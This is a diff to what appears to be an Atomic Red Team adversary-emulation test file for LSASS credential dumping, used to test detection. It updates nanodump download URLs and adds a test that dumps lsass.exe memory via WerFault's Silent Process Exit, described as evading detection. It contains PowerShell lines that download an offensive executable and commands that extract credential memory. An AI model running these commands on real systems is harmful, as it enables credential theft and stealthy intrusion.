@@ -109,10 +109,10 @@ atomic_tests:
     get_prereq_command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
-      Invoke-WebRequest "https://github.com/helpsystems/nanodump/raw/84db0c1737bbe027431733c193cfacf59a07259b/compiled/nanodump.x64.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe"
+      Invoke-WebRequest "https://github.com/fortra/nanodump/blob/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe" 
   executor:
     command: |
-      %temp%\nanodump.x64.exe -w "%temp%\nanodump.dmp"
+      PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe -w "%temp%\nanodump.dmp"
     cleanup_command: |
       del "%temp%\nanodump.dmp" >nul 2> nul
     name: command_prompt
@@ -381,4 +381,43 @@ atomic_tests:
     cleanup_command: |
       Remove-Item $env:TEMP\t1003.001-13-rdrleakdiag -Recurse -Force -ErrorAction Ignore
     name: powershell
+    elevation_required: true
+- name: Dump LSASS.exe Memory through Silent Process Exit
+  auto_generated_guid: eb5adf16-b601-4926-bca7-dad22adffb37
+  description: |
+    WerFault.exe (Windows Error Reporting process that handles process crashes) can be abused to create a 
+    memory dump of lsass.exe, in a directory of your choice. This method relies on a mechanism 
+    introduced in Windows 7 called Silent Process Exit, which provides the ability to trigger
+    specific actions for a monitored process in one of two scenarios; either the process terminates
+    itself by calling ExitProcess(), or another process terminates it via the TerminateProcess() API. 
+    The major advantage of this technique is that it does not cause lsass.exe to crash, and since 
+    WerFault.exe is used to create file dumps all the time (not just lsass.exe), this method provides 
+    the added advantage of going undetected. WerFault.exe is a process known for dumping every crashing process, 
+    from an attacker standpoint this is appealing as their illicit credential extraction will 
+    appear benign because from a defender’s viewpoint it’s within the realm of normal activity.
+
+    Upon successful execution, you should find the dump file in directory of your choice or "%temp%\SilentProcessExit" by default.
+  supported_platforms:
+  - windows
+  input_arguments:
+    output_folder:
+      description: Folder Path where resulting dump should be placed
+      type: path
+      default: '%temp%\SilentProcessExit'
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      NanoDump executable must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe)
+    prereq_command: |
+      if (Test-Path PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe) {exit 0} else {exit 1}
+    get_prereq_command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://github.com/fortra/nanodump/blob/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe"
+  executor:
+    command: |
+      PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe --silent-process-exit "#{output_folder}"
+    cleanup_command: |
+      rmdir "#{output_folder}" /s /q >nul 2> nul
+    name: command_prompt
     elevation_required: true
